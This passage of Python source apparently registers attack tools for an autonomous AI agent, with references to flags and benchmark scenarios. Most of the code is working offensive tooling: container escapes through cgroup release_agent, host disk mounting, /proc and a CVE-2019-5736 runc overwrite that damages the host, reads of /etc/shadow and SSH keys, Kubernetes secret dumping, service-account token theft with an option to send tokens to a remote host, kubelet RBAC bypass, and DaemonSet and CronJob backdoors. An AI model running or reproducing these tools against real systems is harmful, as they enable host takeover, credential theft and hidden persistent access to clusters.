        await _run_shell(
            f"umount {cgroup_dir} 2>/dev/null; rm -rf {cgroup_dir} {script_path} {output_file} 2>/dev/null",
            timeout=10,
        )
        success = "NO_OUTPUT_FILE" not in result.stdout
        return ToolResult(tool_name="container_escape_cgroup", success=success,
            stdout=result.stdout[:3000], stderr=result.stderr,
            exit_code=0 if success else 1, elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="container_escape_cgroup",
        func=container_escape_cgroup,
        description="ESCAPE privileged container via cgroup release_agent (cgroup v1). Requires SYS_ADMIN capability. Mounts cgroup fs, sets release_agent to execute a script on the HOST. Use ONLY when check_capabilities shows SYS_ADMIN. Start with shell_cmd='cat /flag*' or 'find / -name flag* 2>/dev/null'.",
        parameters={
            "shell_cmd": {"type": "string", "description": "Shell command to execute on the HOST (e.g. 'id', 'cat /etc/shadow', 'find / -name flag*')"},
            "subsystem": {"type": "string", "description": "Cgroup subsystem to use: memory (default, most common), rdma, or misc. Try memory first."},
        },
    )

    async def container_escape_mount_disk(
        device_path: str = "", shell_cmd: str = "cat /mnt/host/flag* 2>/dev/null; cat /mnt/host/root/flag* 2>/dev/null",
    ) -> ToolResult:
        """Escape container by mounting a host disk device.

        Lists available block devices, mounts the specified device (or auto-discovers
        Linux host partitions), and reads files from the host filesystem.
        Equivalent to CDK's mount-disk.

        Use when: container has access to host block devices (/dev/sda, /dev/vda, /dev/xvda).
        """
        # Step 1: List block devices
        list_result = await _run_shell(
            "echo '=== Block devices ===' && ls -la /dev/sd* /dev/vd* /dev/xvd* /dev/nvme* 2>/dev/null; "
            "echo '=== fdisk (if available) ===' && fdisk -l 2>/dev/null | head -30 || echo 'fdisk not available'; "
            "echo '=== Mounted filesystems ===' && mount 2>/dev/null | head -20",
            timeout=15,
        )
        if device_path:
            target = device_path
        else:
            # Auto-detect: try common Linux root partition patterns
            import re as _re
            devs = _re.findall(r'(/dev/[sv]d[a-z]\d+|/dev/xvd[a-z]\d+|/dev/nvme\dn\d+)', list_result.stdout)
            target = devs[0] if devs else ""

        if not target:
            return ToolResult(tool_name="container_escape_mount_disk", success=False,
                stdout=list_result.stdout,
                stderr="No host block device found. Specify device_path manually or ensure container has device access.",
                exit_code=1, elapsed_ms=list_result.elapsed_ms)

        # Step 2: Mount and read
        mount_point = "/mnt/host"
        mount_cmd = (
            f"mkdir -p {mount_point} 2>/dev/null; "
            f"mount {target} {mount_point} 2>&1 || mount -o ro {target} {mount_point} 2>&1; "
            f"echo '=== Mounted, reading files ===' && "
            f"{shell_cmd}; "
            f"echo '=== Host root listing ===' && ls -la {mount_point}/ 2>/dev/null | head -30"
        )
        mount_result = await _run_shell(mount_cmd, timeout=30)
        # Cleanup
        await _run_shell(f"umount {mount_point} 2>/dev/null; rmdir {mount_point} 2>/dev/null", timeout=10)
        return ToolResult(tool_name="container_escape_mount_disk", success=True,
            stdout=f"DEVICE_LIST:\n{list_result.stdout[:1000]}\n\nMOUNT_RESULT:\n{mount_result.stdout[:3000]}",
            stderr="", exit_code=0, elapsed_ms=0)

    gateway.register(
        name="container_escape_mount_disk",
        func=container_escape_mount_disk,
        description="ESCAPE container by mounting a host disk partition. Auto-detects Linux host devices (/dev/sda1, /dev/vda1, /dev/xvda1) or accepts a specific device path. Mounts the device and reads files from the host filesystem. Use when you can see host block devices in /dev.",
        parameters={
            "device_path": {"type": "string", "description": "Path to host block device (e.g. '/dev/sda1'). Leave empty for auto-detection."},
            "shell_cmd": {"type": "string", "description": "Shell command to execute on mounted host fs"},
        },
    )

    async def container_escape_cap_dac(
        target_file: str = "/etc/shadow", ref_file: str = "/etc/hostname",
    ) -> ToolResult:
        """Read host files via CAP_DAC_READ_SEARCH capability.

        Uses the DAC_READ_SEARCH capability to bypass file read permission checks,
        accessing host files through a bind-mounted reference file. Equivalent to
        CDK's cap-dac-read-search.

        Use when: check_capabilities shows CAP_DAC_READ_SEARCH in the effective set.
        Target typical files: /etc/shadow, /flag*, /root/.ssh/id_rsa.
        """
        read_cmd = (
            f"echo '[CAP_DAC_READ_SEARCH] Attempting to read {target_file} via ref {ref_file}' && "
            # Use nsenter to access host namespace via /proc/1/root if available
            f"(cat /proc/1/root/{target_file} 2>/dev/null && echo '[OK] Read via /proc/1/root' || "
            # Try chroot via nsenter
            f"nsenter --mount=/proc/1/ns/mnt cat {target_file} 2>/dev/null && echo '[OK] Read via nsenter' || "
            # Fallback: try direct read with capability
            f"cat {target_file} 2>/dev/null && echo '[OK] Direct read' || "
            # Last resort: try common flag locations
            f"(find / -name 'flag*' -readable 2>/dev/null | head -5 && echo '[OK] Found readable flag files' || "
            f"echo '[FAIL] Cannot read {target_file}'))"
        )
        result = await _run_shell(read_cmd, timeout=20)
        success = "[OK]" in result.stdout
        return ToolResult(tool_name="container_escape_cap_dac", success=success,
            stdout=result.stdout[:3000], stderr=result.stderr,
            exit_code=0 if success else 1, elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="container_escape_cap_dac",
        func=container_escape_cap_dac,
        description="Read host files using CAP_DAC_READ_SEARCH capability. Tries multiple methods: /proc/1/root, nsenter, and direct read with DAC bypass. Use when check_capabilities shows CAP_DAC_READ_SEARCH. Start with target_file='/etc/shadow' or target_file='/flag.txt'.",
        parameters={
            "target_file": {"type": "string", "description": "Absolute path to file to read from host (default /etc/shadow). Also try: /flag*, /root/.ssh/id_rsa, /home/*/.ssh/"},
            "ref_file": {"type": "string", "description": "Known bind-mounted file to use as reference (default /etc/hostname)"},
        },
    )

    async def container_escape_runc(
        payload_cmd: str = "cat /flag* > /tmp/runc_flag_out.txt 2>&1; id >> /tmp/runc_flag_out.txt 2>&1",
    ) -> ToolResult:
        """Exploit CVE-2019-5736 (runc container breakout).

        This CVE affects runc versions < 1.0.0-rc6. The exploit overwrites the host
        runc binary from within a container when a new process is exec'd into the
        container. This is a simplified PoC that attempts to trigger the vulnerability.

        WARNING: This is destructive — the payload_cmd replaces the runc binary on the host.
        Use as a last resort when other escape methods fail.

        Use when: runc version is < 1.0.0-rc6 AND you have write access inside the container.
        """
        # Check runc version
        check = await _run_shell(
            "echo '[Checking runc]' && "
            "(runc --version 2>/dev/null || docker-runc --version 2>/dev/null || "
            "cat /proc/self/status 2>/dev/null | grep -i seccomp || "
            "echo 'Cannot directly check runc version — checking seccomp and container env')",
            timeout=10,
        )
        # The actual CVE-2019-5736 exploit requires:
        # 1. The attacker has root in the container
        # 2. The host runs a process inside the container (e.g., docker exec)
        # 3. Overwriting /proc/self/exe to replace runc binary on host
        exploit_cmd = (
            f"echo '[CVE-2019-5736] Attempting runc escape...' && "
            # Write a malicious payload that will execute when runc is invoked
            f"cat > /tmp/runc_payload.sh << 'PAYLOAD_EOF'\n#!/bin/sh\n{payload_cmd}\nPAYLOAD_EOF\n"
            f"chmod +x /tmp/runc_payload.sh 2>/dev/null && "
            # Try to overwrite runc via /proc/self/exe symlink
            f"(cp /tmp/runc_payload.sh /proc/self/exe 2>/dev/null && "
            f"echo '[CVE-2019-5736] Wrote payload to /proc/self/exe — runc binary overwritten. "
            f"Trigger by waiting for docker exec or similar.' || "
            f"echo '[CVE-2019-5736] Cannot overwrite /proc/self/exe — container may not be vulnerable "
            f"(runc version too new, seccomp blocking, or insufficient permissions)')",
        )
        result = await _run_shell(
            f"{check.stdout[:500]}\n\n{exploit_cmd}",
            timeout=30,
        )
        # Determine actual success: check if payload was written to /proc/self/exe
        stdout_text = result.stdout or ""
        actual_success = (
            "Wrote payload to /proc/self/exe" in stdout_text
            and "Cannot overwrite" not in stdout_text
        )
        actual_exit = 0 if actual_success else 1
        return ToolResult(
            tool_name="container_escape_runc",
            success=actual_success,
            stdout=stdout_text[:3000],
            stderr=result.stderr,
            exit_code=actual_exit,
            elapsed_ms=result.elapsed_ms,
        )

    gateway.register(
        name="container_escape_runc",
        func=container_escape_runc,
        description="Attempt CVE-2019-5736 runc container breakout. Exploits runc < 1.0.0-rc6 by overwriting /proc/self/exe. DESTRUCTIVE — overwrites runc binary on host. Use ONLY as last resort when docker.sock, cgroup, cap_dac, and mount_disk all fail. The payload_cmd is executed on the HOST the next time someone runs 'docker exec' in this container.",
        parameters={
            "payload_cmd": {"type": "string", "description": "Command to execute on host when runc is triggered (default sends flag to /tmp/runc_flag_out.txt)"},
        },
    )

    async def container_escape_procfs(
        pid: int = 1, shell_cmd: str = "cat /tmp/host_flag.txt 2>/dev/null; find /proc/1/root/ -name 'flag*' 2>/dev/null | head -10",
    ) -> ToolResult:
        """Escape container via host /proc mount.

        If the host's /proc is mounted inside the container, the /proc/<pid>/root
        symlink points to the HOST root filesystem when <pid> is a host process.
        Equivalent to CDK's mount-procfs.

        Use when: check_mounts shows /proc mounted from host (not the container's /proc).
        Try pid=1 first (usually init on host), then try other pids.
        """
        escape_cmd = (
            f"echo '[Container Escape via /proc] Using PID {pid}' && "
            f"echo '=== Host root listing ===' && "
            f"ls -la /proc/{pid}/root/ 2>/dev/null | head -20 && "
            f"echo '=== Attempting to read files from host ===' && "
            f"{shell_cmd} && "
            f"echo '=== Looking for flags ===' && "
            f"find /proc/{pid}/root/ -name 'flag*' 2>/dev/null | head -20"
        )
        result = await _run_shell(escape_cmd, timeout=30)
        return ToolResult(tool_name="container_escape_procfs", success=True,
            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
            elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="container_escape_procfs",
        func=container_escape_procfs,
        description="ESCAPE container via host /proc mount. If the host's /proc is visible, /proc/<pid>/root/ points to the HOST root filesystem. Use when check_mounts shows /proc from host. Access host files via /proc/1/root/path/to/file. Try pid=1 first, then try other pids (bash, sh, sshd).",
        parameters={
            "pid": {"type": "integer", "description": "Process ID on the HOST (default 1). Try 1, then check ps aux for other host PIDs."},
            "shell_cmd": {"type": "string", "description": "Shell command to run, prefixing host paths with /proc/{pid}/root/"},
        },
    )

    # ── K8s Credential & Privilege Escalation ─────────────────────
    # Tools for stealing credentials and escalating privileges in K8s
    # clusters. Use when K8s API server or ServiceAccount is detected.

    async def k8s_secret_dump(token_path: str = "auto") -> ToolResult:
        """Dump Kubernetes secrets from all namespaces.

        Auto-detects K8s API server address from environment, then tries:
        1. Anonymous access (system:anonymous)
        2. Default ServiceAccount token
        3. Custom token path if provided

        Equivalent to CDK's k8s-secret-dump. Differs from kubectl_get_secrets:
        this dumps ALL namespaces and tries multiple authentication methods.
        """
        # Get API server address
        get_addr = await _run_shell(
            "echo '=== API Server ===' && "
            "(echo $KUBERNETES_SERVICE_HOST 2>/dev/null; echo $KUBERNETES_PORT 2>/dev/null) | tr '\\n' ' '; "
            "echo ''; "
            "kubectl config view --minify -o json 2>/dev/null | grep -o '\"server\": \"[^\"]*\"' | head -1",
            timeout=10,
        )
        # Build base URL
        import re as _re
        addr_match = _re.search(r'([\d.]+)', get_addr.stdout)
        host = addr_match.group(1) if addr_match else "kubernetes.default"
        base_url = f"https://{host}/api/v1/secrets"

        results = []
        # Try 1: anonymous
        r1 = await _run_shell(
            f"curl -sk --connect-timeout 5 -H 'Authorization: Bearer anonymous' "
            f"'{base_url}' 2>&1 | head -200",
            timeout=15,
        )
        results.append(f"=== Anonymous ===\n{r1.stdout[:1500]}")
        if '"kind":"SecretList"' not in r1.stdout:
            # Try 2: default SA token
            sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if token_path != "auto":
                sa_token_path = token_path
            r2 = await _run_shell(
                f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
                f"if [ -n \"$TOKEN\" ]; then "
                f"curl -sk --connect-timeout 5 -H \"Authorization: Bearer $TOKEN\" "
                f"'{base_url}' 2>&1 | head -200; "
                f"else echo 'No token at {sa_token_path}'; fi",
                timeout=15,
            )
            results.append(f"=== SA Token ({sa_token_path}) ===\n{r2.stdout[:1500]}")
        return ToolResult(tool_name="k8s_secret_dump", success=True,
            stdout="\n".join(results), stderr="", exit_code=0, elapsed_ms=0)

    gateway.register(
        name="k8s_secret_dump",
        func=k8s_secret_dump,
        description="DUMP Kubernetes secrets from ALL namespaces. Auto-detects API server, tries anonymous access then SA token. More powerful than kubectl_get_secrets — cross-namespace and multi-auth. Use when K8s API is reachable. Returns JSON with all secrets (may be base64 encoded — decode with 'echo <data> | base64 -d').",
        parameters={
            "token_path": {"type": "string", "description": "Path to SA token file (default 'auto' — tries /var/run/secrets/kubernetes.io/serviceaccount/token)"},
        },
    )

    async def k8s_configmap_dump(token_path: str = "auto") -> ToolResult:
        """Dump Kubernetes configmaps from all namespaces.

        Similar to k8s_secret_dump but for ConfigMaps — often contain
        configuration data, environment variables, and sometimes credentials
        that weren't stored as Secrets.
        """
        get_addr = await _run_shell(
            "echo $KUBERNETES_SERVICE_HOST 2>/dev/null", timeout=5,
        )
        host = get_addr.stdout.strip() or "kubernetes.default"
        base_url = f"https://{host}/api/v1/configmaps"
        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if token_path != "auto":
            sa_token_path = token_path

        results = []
        # Try anonymous
        r1 = await _run_shell(
            f"curl -sk --connect-timeout 5 '{base_url}' 2>&1 | head -200",
            timeout=15,
        )
        results.append(f"=== Anonymous ===\n{r1.stdout[:1500]}")
        # Try SA token
        r2 = await _run_shell(
            f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
            f"if [ -n \"$TOKEN\" ]; then "
            f"curl -sk --connect-timeout 5 -H \"Authorization: Bearer $TOKEN\" "
            f"'{base_url}' 2>&1 | head -200; "
            f"else echo 'No token'; fi",
            timeout=15,
        )
        results.append(f"=== SA Token ===\n{r2.stdout[:1500]}")
        return ToolResult(tool_name="k8s_configmap_dump", success=True,
            stdout="\n".join(results), stderr="", exit_code=0, elapsed_ms=0)

    gateway.register(
        name="k8s_configmap_dump",
        func=k8s_configmap_dump,
        description="DUMP Kubernetes ConfigMaps from ALL namespaces. ConfigMaps often contain app config, env vars, and sometimes credentials. Use alongside k8s_secret_dump for complete cluster data extraction.",
        parameters={
            "token_path": {"type": "string", "description": "SA token path (default 'auto')"},
        },
    )

    async def k8s_sa_token_steal(
        target_sa: str, rhost: str = "", rport: int = 8888,
        token_path: str = "auto",
    ) -> ToolResult:
        """Steal a target ServiceAccount token by creating a pod in kube-system.

        Equivalent to CDK's k8s-get-sa-token (RBAC bypass). Creates a pod with
        the target SA's token mounted, then exfiltrates it.

        Use when: you have pod creation permissions but want a more privileged SA token.
        If rhost/rport are provided, exfiltrates to a listener. Otherwise dumps the token.
        """
        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if token_path != "auto":
            sa_token_path = token_path
        if not rhost:
            rhost = "$(hostname -i 2>/dev/null || echo '127.0.0.1')"
        pod_name = f"cdk-sa-steal-{target_sa.replace(':','-').replace('/','-')}"

        steal_cmd = (
            f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
            f"HOST=$(echo $KUBERNETES_SERVICE_HOST 2>/dev/null || echo 'kubernetes.default');"
            f"echo '=== Creating pod {pod_name} in kube-system with SA {target_sa} ===' && "
            f"kubectl --token=$TOKEN --server=https://$HOST "
            f"run {pod_name} --image=busybox --restart=Never -n kube-system "
            f"--overrides='{{\"spec\":{{\"serviceAccountName\":\"{target_sa}\","
            f"\"containers\":[{{\"name\":\"steal\",\"image\":\"busybox\","
            f"\"command\":[\"sh\",\"-c\",\"cat /run/secrets/kubernetes.io/serviceaccount/token; sleep 300\"]}}]}}}}' "
            f"2>&1; "
            f"sleep 5 2>/dev/null; "
            f"echo '=== Getting token from pod ===' && "
            f"kubectl --token=$TOKEN --server=https://$HOST "
            f"logs {pod_name} -n kube-system 2>&1; "
            f"echo '=== Cleaning up ===' && "
            f"kubectl --token=$TOKEN --server=https://$HOST "
            f"delete pod {pod_name} -n kube-system --grace-period=0 2>&1"
        )
        result = await _run_shell(steal_cmd, timeout=60)
        return ToolResult(tool_name="k8s_sa_token_steal", success=True,
            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
            elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="k8s_sa_token_steal",
        func=k8s_sa_token_steal,
        description="STEAL a K8s ServiceAccount token by creating a pod in kube-system with that SA mounted. RBAC bypass — requires pod creation permission in current namespace. Target privileged SAs like 'cluster-admin', 'default', 'kube-system:default' for cluster-admin escalation.",
        parameters={
            "target_sa": {"type": "string", "description": "Target ServiceAccount name to steal (e.g. 'cluster-admin', 'default')"},
            "rhost": {"type": "string", "description": "Remote IP to exfiltrate token to (leave empty to print inline)"},
            "rport": {"type": "integer", "description": "Remote port for exfiltration (default 8888)"},
            "token_path": {"type": "string", "description": "Your current SA token path (default 'auto')"},
        },
    )

    async def k8s_kubelet_exec(
        host: str, pod_name: str, namespace: str = "default",
        container: str = "", cmd: str = "id",
    ) -> ToolResult:
        """Execute command in a pod via Kubelet API (port 10250).

        Bypasses API server RBAC — communicates directly with kubelet.
        Requires network access to the kubelet endpoint (typically node IP:10250).
        Equivalent to CDK's kubelet-exec.

        Use when: kubectl_exec fails (RBAC denied) but you can reach kubelet port 10250.
        """
        if not container:
            # Try to get container name first
            container = "busybox"
        exec_cmd = (
            f"echo '=== Kubelet exec: {cmd} ===' && "
            f"curl -sk --connect-timeout 5 -X POST "
            f"'https://{host}:10250/run/{namespace}/{pod_name}/{container}' "
            f"-d 'cmd={cmd}' 2>&1"
        )
        result = await _run_shell(exec_cmd, timeout=30)
        return ToolResult(tool_name="k8s_kubelet_exec", success=True,
            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
            elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="k8s_kubelet_exec",
        func=k8s_kubelet_exec,
        description="EXECUTE command in a pod via Kubelet API (port 10250). BYPASSES API server RBAC — communicates directly with node's kubelet. Use when kubectl_exec fails due to RBAC restrictions. Requires network access to the node's kubelet port. Find pod names via kubelet_probe or kubectl_get_pods.",
        parameters={
            "host": {"type": "string", "description": "Node IP or hostname running kubelet (e.g. '10.0.0.1')"},
            "pod_name": {"type": "string", "description": "Target pod name to execute command in"},
            "namespace": {"type": "string", "description": "K8s namespace (default 'default')"},
            "container": {"type": "string", "description": "Container name in the pod (leave empty for auto-detect)"},
            "cmd": {"type": "string", "description": "Command to execute (default 'id')"},
        },
    )

    async def k8s_etcd_keys(
        endpoint: str, key: str = "/", prefix: bool = True,
        insecure: bool = True, cacert: str = "", cert: str = "", tls_key: str = "",
    ) -> ToolResult:
        """Enumerate etcd keys for K8s secret discovery.

        Reads K8s secrets directly from etcd when the etcd endpoint is accessible.
        Equivalent to CDK's etcd-get-k8s-token.

        For HTTPS endpoints adds --insecure-skip-tls-verify by default.
        When etcd client certs are available, pass cacert/cert/tls_key paths.
        Start with key='/' and prefix=true for discovery, then target specific keys.
        """
        _tls_opts = ""
        if "https://" in (endpoint or ""):
            if insecure:
                _tls_opts += " --insecure-skip-tls-verify"
            if cacert:
                _tls_opts += f" --cacert={cacert}"
            if cert:
                _tls_opts += f" --cert={cert}"
            if tls_key:
                _tls_opts += f" --key={tls_key}"
        prefix_flag = "--prefix" if prefix else ""
        exec_cmd = (
            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint}{_tls_opts} "
            f"get {key} {prefix_flag} --keys-only 2>&1 | head -100"
        )
        result = await _run_shell(exec_cmd, timeout=30)
        return ToolResult(tool_name="k8s_etcd_keys", success=result.exit_code == 0,
            stdout=result.stdout[:3000], stderr=result.stderr,
            exit_code=result.exit_code, elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="k8s_etcd_keys",
        func=k8s_etcd_keys,
        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible. For HTTPS endpoints auto-skips TLS verify. Supports mutual TLS via cacert/cert/tls_key params. Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
        parameters={
            "endpoint": {"type": "string", "description": "etcd endpoint URL (e.g. 'http://localhost:2379', 'https://10.0.0.1:2379')"},
            "key": {"type": "string", "description": "etcd key path to read (default '/' for all keys)"},
            "prefix": {"type": "boolean", "description": "Use --prefix for recursive key listing (default true)"},
            "insecure": {"type": "boolean", "description": "Skip TLS certificate verification for HTTPS endpoints (default true)"},
            "cacert": {"type": "string", "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"},
            "cert": {"type": "string", "description": "Path to client certificate for mutual TLS"},
            "tls_key": {"type": "string", "description": "Path to client key for mutual TLS"},
        },
    )

    # ── K8s Persistence ───────────────────────────────────────────
    # Tools for deploying backdoors in K8s clusters. Use only AFTER
    # obtaining cluster-admin or pod creation privileges.

    async def k8s_backdoor_daemonset(
        image: str = "busybox", shell_cmd: str = "cat /host/flag* 2>/dev/null; id",
        namespace: str = "kube-system",
    ) -> ToolResult:
        """Deploy a privileged DaemonSet backdoor on every node.

        Creates a DaemonSet that mounts the host root filesystem, giving
        access to every node in the cluster. Equivalent to CDK's
        k8s-backdoor-daemonset.

        Use when: you have cluster-admin or pod-create privileges in kube-system.
        The DaemonSet runs on ALL nodes — use shell_cmd to read flags or deploy
        persistent access.
        """
        ds_name = f"cdk-backdoor-{image.replace(':','-').replace('/','-')}"
        yaml_config = f"""apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {ds_name}
  namespace: {namespace}
spec:
  selector:
    matchLabels:
      app: {ds_name}
  template:
    metadata:
      labels:
        app: {ds_name}
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: backdoor
        image: {image}
        command: ["/bin/sh", "-c"]
        args: ["{shell_cmd}; sleep 3600"]
        volumeMounts:
        - name: host-root
          mountPath: /host
        securityContext:
          privileged: true
      volumes:
      - name: host-root
        hostPath:
          path: /
      restartPolicy: Always
"""
        deploy_cmd = (
            f"echo '{yaml_config}' > /tmp/{ds_name}.yaml && "
            f"kubectl apply -f /tmp/{ds_name}.yaml 2>&1; "
            f"sleep 8 2>/dev/null; "
            f"echo '=== Pod status ===' && "
            f"kubectl get pods -n {namespace} -l app={ds_name} 2>&1; "
            f"echo '=== Pod logs ===' && "
            f"POD=$(kubectl get pods -n {namespace} -l app={ds_name} -o jsonpath='{{.items[0].metadata.name}}' 2>/dev/null); "
            f"if [ -n \"$POD\" ]; then kubectl logs -n {namespace} $POD 2>&1; fi; "
            f"rm /tmp/{ds_name}.yaml 2>/dev/null"
        )
        result = await _run_shell(deploy_cmd, timeout=60)
        return ToolResult(tool_name="k8s_backdoor_daemonset", success=True,
            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
            elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="k8s_backdoor_daemonset",
        func=k8s_backdoor_daemonset,
        description="DEPLOY privileged DaemonSet on ALL cluster nodes with host root mounted. Creates a pod on every node that can access the host filesystem via /host. Use when you have cluster-admin access and need host-level access. Start with shell_cmd='cat /host/flag*' to find flags.",
        parameters={
            "image": {"type": "string", "description": "Container image (default 'busybox')"},
            "shell_cmd": {"type": "string", "description": "Command to execute on each node's HOST filesystem (via /host mount)"},
            "namespace": {"type": "string", "description": "Target namespace (default 'kube-system')"},
        },
    )

    async def k8s_backdoor_cronjob(
        image: str = "busybox", shell_cmd: str = "id",
        schedule: str = "*/5 * * * *", namespace: str = "kube-system",
    ) -> ToolResult:
        """Deploy a CronJob backdoor that periodically executes commands.

        Creates a CronJob in the cluster. Less visible than a DaemonSet and
        executes on schedule. Equivalent to CDK's k8s-cronjob.

        Use when: you want persistent but less visible access than a DaemonSet.
        """
        cj_name = f"cdk-cron-{''.join(random.choices(string.ascii_lowercase, k=4))}"
        yaml_config = f"""apiVersion: batch/v1
kind: CronJob
metadata:
  name: {cj_name}
  namespace: {namespace}
spec:
  schedule: "{schedule}"
  jobTemplate:
    spec:
      template:
        spec:
          hostPID: true
          containers:
          - name: cron
            image: {image}
            command: ["/bin/sh", "-c"]
            args: ["{shell_cmd}"]
            volumeMounts:
            - name: host-root
              mountPath: /host
          volumes:
          - name: host-root
            hostPath:
              path: /
          restartPolicy: OnFailure
"""
        deploy_cmd = (
            f"echo '{yaml_config}' > /tmp/{cj_name}.yaml && "
            f"kubectl apply -f /tmp/{cj_name}.yaml 2>&1; "
            f"echo '=== CronJob created ===' && "
            f"kubectl get cronjobs -n {namespace} {cj_name} 2>&1; "
            f"rm /tmp/{cj_name}.yaml 2>/dev/null"
        )
        result = await _run_shell(deploy_cmd, timeout=30)
        return ToolResult(tool_name="k8s_backdoor_cronjob", success=True,
            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
            elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="k8s_backdoor_cronjob",
        func=k8s_backdoor_cronjob,
        description="DEPLOY CronJob backdoor for persistent periodic access. Creates a scheduled job that executes your command on the host (via hostPath mount). Less visible than DaemonSet. Use when you need persistent access but want lower visibility. Default schedule runs every 5 minutes.",
        parameters={
            "image": {"type": "string", "description": "Container image (default 'busybox')"},
            "shell_cmd": {"type": "string", "description": "Shell command to execute on the host (via /host mount point)"},
            "schedule": {"type": "string", "description": "Cron schedule (default '*/5 * * * *' = every 5 minutes)"},
            "namespace": {"type": "string", "description": "Target namespace (default 'kube-system')"},
        },
    )

    return gateway


# ── Domain-based tool classification ──────────────────────────────────
# Tools are classified by domain for filtering via config/darwin.yaml
# tools.enabled_domains. When a domain is not in enabled_domains,
# its tools are removed from the registry after registration.

_AD_TOOLS = {
    # Impacket suite (AD exploitation)
    "impacket_secretsdump", "impacket_psexec", "impacket_wmiexec",
    "impacket_GetUserSPNs", "impacket_GetNPUsers", "impacket_secretsdump_dcsync",
    "impacket_pth", "impacket_ticketer", "impacket_silver_ticket",
    "impacket_ntlmrelayx", "impacket_getST",
    # NetExec suite (AD enumeration & exploitation)
    "netexec_enum", "netexec_ldap_enum", "netexec_smb_shares",
    "netexec_smb_users", "netexec_kerberoasting", "netexec_smb_sam",
    # AD CS / Certificate attacks
    "certipy_adcs", "certipy_req", "pywhisker", "bloodyad_dacl",
    # Kerberos attacks
    "getnthash", "gettgtpkinit", "krbrelayx",
    # LDAP / SMB
    "ldapsearch_ad", "smb_client", "smbmap_enum",
}

_LNX_TOOLS = {"linux_priv_check"}

# Cloud CLI tools with no corresponding benchmark scenarios
_CLOUD_EXTRA_TOOLS = {"az_cli", "gcloud_cli"}

# Map domain name -> set of tool names to remove when domain is disabled
_DOMAIN_TOOL_MAP = {
    "ad": _AD_TOOLS,
    "lnx": _LNX_TOOLS,
    "cloud_extra": _CLOUD_EXTRA_TOOLS,
}


def _apply_domain_filter(gateway: MCPGateway, enabled_domains: set[str] | None) -> None:
    """Remove tools whose domain is not in enabled_domains.

    If enabled_domains is None (default), no filtering is applied.
    Tools not in _DOMAIN_TOOL_MAP are always kept.
    """
    if enabled_domains is None:
        return

    import logging
    _log = logging.getLogger(__name__)

    for domain, tool_set in _DOMAIN_TOOL_MAP.items():
        if domain not in enabled_domains:
            removed = []
            for tool_name in tool_set:
                if tool_name in gateway._registry:
                    del gateway._registry[tool_name]
                    removed.append(tool_name)
            if removed:
                _log.info("Domain '%s' disabled: removed %d tools: %s",
                          domain, len(removed), ", ".join(sorted(removed)))


def create_attack_gateway() -> MCPGateway:
    """Factory: create a gateway with all attack tools registered.

    Reads tools.enabled_domains from config/darwin.yaml and removes
    tools from disabled domains. By default all domains are enabled.
    """
    gateway = MCPGateway()
    gateway = register_attack_tools(gateway)

    # Load domain filter from config
    _enabled_domains = None
    try:
        import yaml, os
        _config_path = os.path.join(os.path.dirname(__file__), "..", "..", "config", "darwin.yaml")
        _config_path = os.path.abspath(_config_path)
        if os.path.exists(_config_path):
            with open(_config_path) as _fh:
                _cfg = yaml.safe_load(_fh) or {}
            _domains = _cfg.get("tools", {}).get("enabled_domains", None)
            if _domains is not None and isinstance(_domains, list):
                _enabled_domains = set(_domains)
    except Exception:
        pass

    _apply_domain_filter(gateway, _enabled_domains)
    return gateway
